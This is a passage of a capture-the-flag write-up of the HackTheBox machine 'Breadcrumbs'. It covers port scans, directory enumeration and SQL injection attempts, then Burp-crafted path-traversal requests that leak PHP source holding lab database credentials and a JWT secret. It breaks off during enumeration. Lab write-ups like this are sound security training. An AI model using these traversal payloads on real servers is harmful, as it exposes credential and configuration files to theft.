---
layout: post
title: HackTheBox Write-up &mdash; Breadcrumbs
---

This machine is a *Windows* machine on IP `10.10.10.228`.  This will be a challenge for it is a Windows machine, and my first one at that!

I see what ports I have access to!

```bash
/:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings:
|   JavaRMI, LANDesk-RC, NULL, RTSPRequest, TLSSessionReq:
|_    Host '10.10.14.239' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=3/14%Time=604EC478%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.239'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.239'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionReq
SF:,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.239'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,4B
SF:,"G\0\0\x01\xffj\x04Host\x20'10\.10\.14\.239'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4B,"G\0\
SF:0\x01\xffj\x04Host\x20'10\.10\.14\.239'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -56m50s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-15T01:24:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.32 seconds
```

Notice a few different terms here:
  - `msrpc`
  - `netbios-ssn`

I also search for `msrpc` ([see here](https://www.extrahop.com/resources/protocols/msrpc/)).  This pertains to *Windows RPC*, which seems to stand for "Remote Procedure Call" (also known as a function call or a subtroutine call); a protocol that uses the client0server model in order to allow one programme to request service from a programme or another computer without having to understand the details of that computer's network.

Searching `netbios-ssn` [we find](https://www.wikiwand.com/en/NetBIOS) we find it is a tool providing services allowing applications on separate computers to communicate over a LAN.

We also see an `http` port open on `443`.  Let's add this machine to our hosts file for ease of reference:
```bash
echo "10.10.10.228" breadcrumbs | sudo tee -a /etc/hosts
```

Now we go onto
```
http://breadcrumbs:443/
```

And we get this message:
```
Bad Request

Your browser sent a request that this server could not understand.
Reason: You're speaking plain HTTP to an SSL-enabled server port.
Instead use the HTTPS scheme to access this URL, please.
```

[We know](https://github.com/jakewilliami/http-status-cheat-sheet/blob/master/http-status-cheat-sheet.pdf) that `HTTP` status code `400` (Bad Request) means that the server cannot or will not process the request due to an apparent client error.

We try again, this time without a port to let the server do the work:
```
http://breadcrumbs/
```
And we find this online library website.  Interesting.  A quick look at the source code reveals an open directory!: `http://breadcrumbs/php/books.php led me to
```
http://breadcrumbs/php/
```

But in fact, this open directory has only one element in it, and that is the `books.php` site which we already have access to.  This is an interface where you can enter a title and an author, and search for books.  I enter the book I am currently reading: Crime and Punishment, by Fyodor Dostoyevsky.  But we get the message: `Nothing found :(`.

What my immediate thought is, is SQL Injection.  It is likely searching from a database, and we see `mysql` on port `3306`, so let's give it a go!

The search query should look something like this:
```sql
SELECT ? FROM ? WHERE ? LIKE '%SEARCHQUERY%';
```

We want to escape the search query and then run something.

I type `%` into either search bar, and it comes up with all of the things in the database.  This is good, as `%` is a wildcard character.

I also tried typing
```
';--
```
which should have also come up with everything, but that returned nothing.  We also note that each book has a description, and a max borrow duration, so the database may have four or five columns.

This tells us that one of the following is what we have:
```sql
SELECT ? FROM ? WHERE Title LIKE '%' OR Author LIKE '%';
SELECT ? FROM ? WHERE Title LIKE "%" OR Author LIKE "%";
SELECT ? FROM ? WHERE Title LIKE % OR Author LIKE %;
```

We can try putting a comment in early:
```sql
SELECT ? FROM ? WHERE Title LIKE "%";-- " OR Author LIKE "%";
```

What I am trying to do is stop the SQL Query before author, and put `Twain` as an author.  I think when I do this, this would mean that Twain does not appear.

So I try putting in `';--` in the Title part, but Tom Sawyer still shows up...

But I think I have been going about this wrong.  This is what may be actually happening:
```sql
inputTitle = getRequestString("Sawyer");
inputAuthor = getRequestString("Twain");
tSQL = "SELECT ? FROM ? WHERE Title = " + inputTitle + "OR WHERE Author = " + inputAuthor;
```

The fact that putting `'` into the search bar comes up with `Alice's Adventures in Wonderland` makes me think that the single quote is escaped correctly, unfortunately.

I have spent a long time trying to get this to work.  I think there is *something* here, because I can use the SQL wildcard, but I think I need to have another look at the source code of the page for more information.

I just found `view-source:http://breadcrumbs/js/books.js` which contains the following code:
```javascript
$(document).ready(function(){
    var book = null;
    $("#note").click(function(){
        $("#tableBody").html("");
        const title = $("#title").val();
        const author = $("#author").val();
        if(title == "" && author == ""){
            $("#message").html("Nothing found :(");
        }
        else{
            searchBooks(title, author);
        }
    })

    $("#interested").click(function(){

    });
});

function getInfo(e){
    const bookId = "book" + $(e).closest('tr').attr('id') + ".html";
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            book: bookId,
            method: 1,
        },
        dataType: "json",
        success: function(res){
            $("#about").html(res);
        }
    });
}

function modal(){
    return '<button type="button" onclick="getInfo(this)" class="btn btn-outline-warning" data-toggle="modal" data-target="#actionModal">Book</button>';
}

function searchBooks(title, author){
    jQuery.ajax({
        url: "../includes/bookController.php",
        type: "POST",
        data: {
            title: title,
            author: author,
            method: 0,
        },
        dataType: "json",
        success: function(res){
            if(res.length == 0 || res == false){
                $("#message").html("Nothing found :(");
            }
            else{
                let ret = "";
                for(book in res){
                    $("#message").html("");
                    ret += "<tr id='" + res[book].id + "'>";
                    ret += "<td>"+res[book].title+"</td>";
                    ret += "<td>"+res[book].author+"</td>";
                    ret += "<td>" + modal() + "</td>";
                    ret += "</tr>";
                    $("#tableBody").html(ret)
                }
            }
        }
    });
}
```

So perhaps I had gone the wrong path with SQL Injections.  It looks like it uses an ajax query.  I think that perhaps one important bit lies here:
```javascript
let ret = "";
for(book in res){
	$("#message").html("");
	ret += "<tr id='" + res[book].id + "'>";
	ret += "<td>"+res[book].title+"</td>";
	ret += "<td>"+res[book].author+"</td>";
	ret += "<td>" + modal() + "</td>";
	ret += "</tr>";
	$("#tableBody").html(ret)
}
```

This programmatically produces a table in HTML, but gives us some valuable insight into how the table data is called.

What this does tell us is that there are at least three (possibly four) columns in the database: `id`, `title`, `author`, and possibly information.

Going into `http://breadcrumbs/js/` we see a `main.js` at `http://breadcrumbs/js/main.js`, but we cannot view this for some reason.  Though, it returns status code `200`, so perhaps it is an empty file?

We can also go to `http://breadcrumbs/includes/` and see `http://breadcrumbs/includes/bookController.php`, which is apparently empty as well.

Let's enumerate the page to see if there is any other ones we can find, other than `includes` and `js`:
```bash
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -t 50 -e -u http://breadcrumbs/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://breadcrumbs/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/15 22:18:40 Starting gobuster
===============================================================
http://breadcrumbs/.htaccess (Status: 403)
http://breadcrumbs/.htpasswd (Status: 403)
http://breadcrumbs/Books (Status: 301)
http://breadcrumbs/DB (Status: 301)
http://breadcrumbs/PHP (Status: 301)
http://breadcrumbs/aux (Status: 403)
http://breadcrumbs/books (Status: 301)
http://breadcrumbs/cgi-bin/ (Status: 403)
http://breadcrumbs/com1 (Status: 403)
http://breadcrumbs/com2 (Status: 403)
http://breadcrumbs/com4 (Status: 403)
http://breadcrumbs/com3 (Status: 403)
http://breadcrumbs/con (Status: 403)
http://breadcrumbs/css (Status: 301)
http://breadcrumbs/db (Status: 301)
http://breadcrumbs/includes (Status: 301)
http://breadcrumbs/js (Status: 301)
http://breadcrumbs/licenses (Status: 403)
http://breadcrumbs/lpt2 (Status: 403)
http://breadcrumbs/lpt1 (Status: 403)
http://breadcrumbs/nul (Status: 403)
http://breadcrumbs/php (Status: 301)
http://breadcrumbs/phpmyadmin (Status: 403)
http://breadcrumbs/portal (Status: 301)
http://breadcrumbs/prn (Status: 403)
http://breadcrumbs/secci� (Status: 403)
http://breadcrumbs/server-info (Status: 403)
http://breadcrumbs/server-status (Status: 403)
http://breadcrumbs/webalizer (Status: 403)
===============================================================
2021/03/15 22:20:32 Finished
===============================================================
```

I go to `http://breadcrumbs/books/` and find an open directory of HTML files!  This is where the information of each book is kept, it seems.

Also going to `http://breadcrumbs/DB/` we find a file, `db.php`, but it seems empty.

Going to `http://breadcrumbs/portal/` we see a login, and a message saying
```
Restricted domain for: 10.10.14.239
Please return home or contact helper if you think there is a mistake.
```

If you click on `helper` you get to the webpage `http://breadcrumbs/portal/php/admins.php`.  This page shows a table This means they surely have some database of users we can access!

Going back to the login portal, we can go to a signup link.  We sign up and log in, and now we have access to the following site:
![_config.yml]({{ site.baseurl }}/images/breadcrumbs-portal-binary.png)

Now we have access to this site: `http://breadcrumbs/portal/php/users.php`.  This gives us all of the users' names, ages, and positions:

<table align="center">
	<thead>
		<tr>
			<td>Username</td>
			<td>Age</td>
			<td>Position</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>alex</code></td>
			<td>21</td>
			<td>Admin</td>
		</tr>
		<tr>
			<td><code>paul</code></td>
			<td>24</td>
			<td>Admin</td>
		</tr>
		<tr>
			<td><code>jack</code></td>
			<td>22</td>
			<td>Admin</td>
		</tr>
		<tr>
			<td><code>olivia</code></td>
			<td>24</td>
			<td>Data Analyst</td>
		</tr>
		<tr>
			<td><code>john</code></td>
			<td>39</td>
			<td>Ad Manager</td>
		</tr>
		<tr>
			<td><code>emma</code></td>
			<td>20</td>
			<td>Developer</td>
		</tr>
		<tr>
			<td><code>william</code></td>
			<td>20</td>
			<td>Developer</td>
		</tr>
		<tr>
			<td><code>lucas</code></td>
			<td>25</td>
			<td>Developer</td>
		</tr>
		<tr>
			<td><code>sirine</code></td>
			<td>27</td>
			<td>Reception</td>
		</tr>
		<tr>
			<td><code>juliette</code></td>
			<td>20</td>
			<td>Server Admin</td>
		</tr>
		<tr>
			<td><code>support</code></td>
			<td>-</td>
			<td>Service</td>
		</tr>
		<tr>
			<td><code>christophertatlock</code></td>
			<td>-</td>
			<td>Awaiting approval</td>
		</tr>
	</tbody>
</table>

There is also an Issues tab, which has some issues:
![_config.yml]({{ site.baseurl }}/images/breadcrumbs-portal-issues.png)

The fact that this box is called "Breadcrumbs" seems to me that I should *follow the breadcrumbs*, as it were, and look for an exploit using that logout button...  It is also important to note the other issue: `Fix PHPSESSID infinite session duration`.  I think this could be useful.

Just a side note, but I think this is very funny:
![_config.yml]({{ site.baseurl }}/images/breadcrumbs-portal-pizza.png)

Finally, there is a File Management tab, but it always redirects me to my user home, presumably because I don't have access rights to files...

I access my session cookies:
<table align="center">
	<thead>
		<tr>
			<td>Name</td>
			<td>Value</td>
			<td>Domain</td>
			<td>Expired / Max-Age</td>
			<td>Size</td>
			<td>HttpOnly</td>
			<td>Secure</td>
			<td>SameSite</td>
			<td>Last Accessed</td>
		</tr>
	</thead>
	<tbody>
		<tr>
			<td><code>PHPSESSID</code></td>
			<td><code>christophertatlock09e0edc23e6382227ca9de420edb3ed0</code></td>
			<td>breadcrumbs</td>
			<td>Session</td>
			<td>59</td>
			<td><code>false</code></td>
			<td><code>false</code></td>
			<td>None</td>
			<td>Tue, 16 Mar 2021 07:20:03 GMT</td>
		</tr>
		<tr>
			<td>token</td>
			<td><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiY2hyaXN0b3BoZXJ0YXRsb2NrIn19.5JlFmYKQUpQ4VEtuRp77FxrmY0BJBZReewDJR0uDqFQ</code></td>
			<td>breadcrumbs</td>
			<td>Thu, 15 Apr 2021 07:20:03 GMT</td>
			<td>142</td>
			<td><code>false</code></td>
			<td><code>false</code></td>
			<td>None</td>
			<td>Tue, 16 Mar 2021 07:20:03 GMT</td>
		</tr>
	</tbody>
</table>

The important thing is the `PHPSESSID` code, which apparently last forever.  Surely we can use that for an exploit.

I also find the open directory `http://breadcrumbs/portal/includes/`, which has the following files in it:
  - `filesController.php`
  - `footer.php`
  - `issuesController.php`
  - `usersController.php`

Naturally, I am interested in `filesController.php`: the one that controls the subdomain we don't yet have access to...  Unfortunately, the only one we have access to, it seems, is `footer.php`.

---

Going back to the library briefly, I use Burp Suite to catch the request to get a book by sending the intercepted procxy to repeater.  Here is what it looks like:
![_config.yml]({{ site.baseurl }}/images/breadcrumbs-library-request.png)

If we send this to a repeater, and change the book name, we get the following error:
![_config.yml]({{ site.baseurl }}/images/breadcrumbs-library-request-error.png)

This gives us some information about the file it is using to request the books (and where on the server it is located).

Recall that we have a `DB` subdirectory, with a `db.php` file in it, which we found was "empty" (probably because of rights).  Let's try this same method to request that file...  This is the response:
```
HTTP/1.1 200 OK
Date: Wed, 17 Mar 2021 00:07:03 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
X-Powered-By: PHP/8.0.1
Content-Length: 272
Connection: close
Content-Type: text/html; charset=UTF-8

"<?php\r\n\r\n$host=\"localhost\";\r\n$port=3306;\r\n$user=\"bread\";\r\n$password=\"jUli901\";\r\n$dbname=\"bread\";\r\n\r\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\r\n?>\r\n"
```

If we put this response into a text file, and remove those pesky windows line endings, we get
```bash
$ sed 's/\\r\\n/\n/g' dbresponse.txt
"<?php

$host=\"localhost\";
$port=3306;
$user=\"bread\";
$password=\"jUli901\";
$dbname=\"bread\";

$con = new mysqli($host, $user, $password, $dbname, $port) or die (\'Could not connect to the database server\' . mysqli_connect_error());
?>
"
```

So we see that they are using MySQL (which we already suspected).  We also see a username and password...

Recall the login page we say earlier, under the `portal`.  We try these credentials on the login page, but it does not let us in.  I try another response, specifying
```
book=../portal/login.php&method=1
```
to see what kind of login code they use.  This is the response:
```html
<?php
require_once 'authController.php';
?>
<?php
require_once 'authController.php';
?>
<html lang="en">
    <head>
        <title>Binary</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="assets/css/main.css">
        <link rel="stylesheet" type="text/css" href="assets/css/all.css">
    </head>
<body class="bg-dark text-white">
    <div class="container-fluid mt-5">
        <div class="row justify-content-center">
            <div class="col-md-4 form-div">
                <div class="alert alert-danger">
                    <p class="text-dark">Restricted domain for: <span class='text-danger'><?=$IP?></span><br> Please return <a href="../">home</a> or contact <a href="php/admins.php">helper</a> if you think there is a mistake.</p>
                </div>
                <h3 class="text-center">Login <i class="fas fa-lock"></i></h3>
                <form action="login.php" method="post">
                    <?php if(count($errors)>0):?>
                    <div class="alert alert-danger">
                        <?php foreach($errors as $error): ?>
                        <li><?php echo $error; ?></li>
                        <?php endforeach?>
                    </div>
                    <?php endif?>
                    
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" name="username" class="form-control form-control-lg">
                    </div>
ttttt
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" name="password" class="form-control form-control-lg">
                    </div>
                    
                    <input value="0" name="method" style="display:none;">

                    <div class="form-group">
                        <button type="submit" class="btn btn-primary btn-block btn-lg">Login</button>
                    </div>

                    <p class="text-center">Dont have an account? <a href="signup.php">Sign up</a></p>
                </form>
            </div>
        </div>
    </div>
    <?php include 'includes/footer.php' ?>
</body>
</html>
```

Now I am interested in `authController.php`, as that is the first thing we import.

This is the response that we get:
```php
<?php
require 'db/db.php';
require "cookie.php";
require "vendor/autoload.php";
use FirebaseJWTJWT;

$errors = array();
$username = "";
$userdata = array();
$valid = false;
$IP = $_SERVER['REMOTE_ADDR'];

//if user clicks on login
if($_SERVER['REQUEST_METHOD'] === "POST"){
    if($_POST['method'] == 0){
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        $query = "SELECT username,position FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($query);
        $stmt->bind_param('s', $username);
        $stmt->execute();
        $result = $stmt->get_result();
        while ($row = $result->fetch_array(MYSQLI_ASSOC)){
            array_push($userdata, $row);
        }
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $password = sha1($password);
            $passwordQuery = "SELECT * FROM users WHERE password=? AND username=? LIMIT 1";
            $stmt = $con->prepare($passwordQuery);
            $stmt->bind_param('ss', $password, $username);
            $stmt->execute();
            $result = $stmt->get_result();

            if($result->num_rows > 0){
                $valid = true;
            }
            $stmt->close();
        }

        if($valid){
            session_id(makesession($username));
            session_start();

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                "data" => array(
                    "username" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');
            
            setcookie("token", $jwt, time() + (86400 * 30), "/");

            $_SESSION['username'] = $username;
            $_SESSION['loggedIn'] = true;
            if($userdata[0]['position'] == ""){
                $_SESSION['role'] = "Awaiting approval";
            }
            else{
                $_SESSION['role'] = $userdata[0]['position'];
            }
            
            header("Location: /portal");
        }

        else{
            $_SESSION['loggedIn'] = false;
            $errors['valid'] = "Username or Password incorrect";
        }
    }

    elseif($_POST['method'] == 1){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $passwordConf=$_POST['passwordConf'];
        
        if(empty($username)){
            $errors['username'] = "Username Required";
        }
        if(strlen($username) < 4){
            $errors['username'] = "Username must be at least 4 characters long";
        }
        if(empty($password)){
            $errors['password'] = "Password Required";
        }
        if($password !== $passwordConf){
            $errors['passwordConf'] = "Passwords don't match!";
        }

        $userQuery = "SELECT * FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($userQuery);
        $stmt ->bind_param('s',$username);
        $stmt->execute();
        $result = $stmt->get_result();
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $errors['username'] = "Username already exists";
        }

        if(count($errors) === 0){
            $password = sha1($password);
            $sql = "INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')";
            $stmt = $con->prepare($sql);
            $stmt ->bind_param('ss', $username, $password);

            if ($stmt->execute()){
                $user_id = $con->insert_id;
                header('Location: login.php');
            }
            else{
                $_SESSION['loggedIn'] = false;
                $errors['db_error']="Database error: failed to register";
            }
        }
    }
}
```

Now I want to see what is in that `files.php` file, so I get that too:
```html
<?php session_start();
$LOGGED_IN = false;
if($_SESSION['username'] !== "paul"){
    header("Location: ../index.php");
}
if(isset($_SESSION['loggedIn'])){
    $LOGGED_IN = true;
    require '../db/db.php';
}
else{
    header("Location: ../auth/login.php");
    die();
}
?>
<html lang="en">
    <head>
        <title>Binary</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="../assets/css/main.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/all.css">
    </head>

    <nav class="navbar navbar-default justify-content-end">
        <div class="navbar-header justify-content-end">
            <button type="button" class="navbar-toggle btn btn-outline-info p-3 m-3" data-toggle="collapse" data-target=".navbar-collapse"><i class="fas fa-hamburger"></i></button>
        </div>

        <div class="collapse navbar-collapse justify-content-end mr-5">
             <ul class="navbar-nav">
                <li class="nav-item"><a class="nav-link text-right" href="../index.php"><i class="fas fa-home"></i> Home</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="issues.php"><i class="fa fa-check" aria-hidden="true"></i> Issues</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="users.php"><i class="fa fa-user" aria-hidden="true"></i> User Management</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="#"><i class="fa fa-file" aria-hidden="true"></i> File Management</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="../auth/logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
             </ul>
        </div>
    </nav>
    <body class="bg-dark">
        <main class="main">
            <div class="row justify-content-center text-white text-center">
                <div class="col-md-3">
                    <h1>Task Submission</h1>
                    <p class="text-danger"><i class="fas fa-exclamation-circle"></i> Please upload only .zip files!</p>
                    <form onsubmit="return false">
                        <div class="form-group mt-5">
                            <input type="text" class="form-control" placeholder="Task completed" id="task" name="task">
                        </div>
                        <div class="form-group">
                            <input type="file" class="form-control" placeholder="Task" id="file" name="file">
                        </div>
                        <button type="submit" class="btn btn-outline-success btn-block py-3" id="upload">Upload</button>
                    </form>
                    <p id="message"></p>
                </div>
            </div>
        </div>
        </main>

        <?php include "../includes/footer.php"; ?>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
        <script type="text/javascript" src='../assets/js/files.js'></script>
    </body>


</html>
```

Interesting to note that Paul is an exception to this.

I am also interested in `filesController.php` from `book=../portal/includes/fileController.php&method=1`:

```php
<?php
$ret = "";
require "../vendor/autoload.php";
use FirebaseJWTJWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));   
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '../uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir/$name")){
            $ret = "Success. Have a great weekend!";
        }     
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}

?>
```

Note that this secret key is the same one as in `authController.php`.  I wonder if we can use this somewhere.  It also looks like, despite that table earlier, Paul is the only "true" admin?

In this file above, there is a reference to an `autoload.php` file, which seems to contain the following:

```php
<?php

// autoload.php @generated by Composer

require_once __DIR__ . '/composer/autoload_real.php';

return ComposerAutoloaderInit14fac1db78f754e0a19e8dd63dfdaad0::getLoader();

?>
```

We now have a look at this `autoload_real.php` file:
```php
<?php

// autoload_real.php @generated by Composer

class ComposerAutoloaderInit14fac1db78f754e0a19e8dd63dfdaad0
{
    private static $loader;

    public static function loadClassLoader($class)
    {
        if ('ComposerAutoloadClassLoader' === $class) {
            require __DIR__ . '/ClassLoader.php';
        }
    }

    /**
     * @return ComposerAutoloadClassLoader
     */
    public static function getLoader()
    {
        if (null !== self::$loader) {
            return self::$loader;
        }

        require __DIR__ . '/platform_check.php';

        spl_autoload_register(array('ComposerAutoloaderInit14fac1db78f754e0a19e8dd63dfdaad0', 'loadClassLoader'), true, true);
        self::$loader = $loader = new ComposerAutoloadClassLoader();
        spl_autoload_unregister(array('ComposerAutoloaderInit14fac1db78f754e0a19e8dd63dfdaad0', 'loadClassLoader'));

        $useStaticLoader = PHP_VERSION_ID >= 50600 && !defined('HHVM_VERSION') && (!function_exists('zend_loader_file_encoded') || !zend_loader_file_encoded());
        if ($useStaticLoader) {
            require __DIR__ . '/autoload_static.php';

            call_user_func(ComposerAutoloadComposerStaticInit14fac1db78f754e0a19e8dd63dfdaad0::getInitializer($loader));
        } else {
            $map = require __DIR__ . '/autoload_namespaces.php';
            foreach ($map as $namespace => $path) {
                $loader->set($namespace, $path);
            }

            $map = require __DIR__ . '/autoload_psr4.php';
            foreach ($map as $namespace => $path) {
                $loader->setPsr4($namespace, $path);
            }

            $classMap = require __DIR__ . '/autoload_classmap.php';
            if ($classMap) {
                $loader->addClassMap($classMap);
            }
        }

        $loader->register(true);

        return $loader;
    }
}

?>
```

Let's enumerate the `/portal/` subdomain again to see what we can find:

```===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://breadcrumbs/portal/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/16 23:42:15 Starting gobuster
===============================================================
http://breadcrumbs/portal/.htaccess (Status: 403)
http://breadcrumbs/portal/.htpasswd (Status: 403)
http://breadcrumbs/portal/DB (Status: 301)
http://breadcrumbs/portal/PHP (Status: 301)
http://breadcrumbs/portal/assets (Status: 301)
http://breadcrumbs/portal/aux (Status: 403)
http://breadcrumbs/portal/com3 (Status: 403)
http://breadcrumbs/portal/com4 (Status: 403)
http://breadcrumbs/portal/com2 (Status: 403)
http://breadcrumbs/portal/com1 (Status: 403)
http://breadcrumbs/portal/con (Status: 403)
http://breadcrumbs/portal/db (Status: 301)
http://breadcrumbs/portal/includes (Status: 301)
http://breadcrumbs/portal/lpt2 (Status: 403)
http://breadcrumbs/portal/lpt1 (Status: 403)
http://breadcrumbs/portal/nul (Status: 403)
http://breadcrumbs/portal/php (Status: 301)
http://breadcrumbs/portal/prn (Status: 403)
http://breadcrumbs/portal/secci￳ (Status: 403)
http://breadcrumbs/portal/uploads (Status: 301)
http://breadcrumbs/portal/vendor (Status: 301)
===============================================================
2021/03/16 23:44:15 Finished
===============================================================
```